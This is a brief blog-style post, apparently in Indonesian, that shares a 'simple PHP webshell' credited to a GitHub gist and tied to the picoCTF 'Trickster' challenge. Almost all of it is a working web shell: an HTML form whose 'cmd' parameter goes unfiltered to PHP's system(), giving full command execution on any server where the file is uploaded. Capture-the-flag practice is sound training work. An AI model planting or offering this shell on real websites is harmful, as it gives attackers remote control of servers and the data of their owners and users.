---
title: easy-simple-php-webshell.php
published: true
---
Dari [joswr1ght](gist.github.com/joswr1ght) untuk challenges picoCTF [Trickster](https://play.picoctf.org/practice/challenge/445?category=1&difficulty=2&page=1).

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```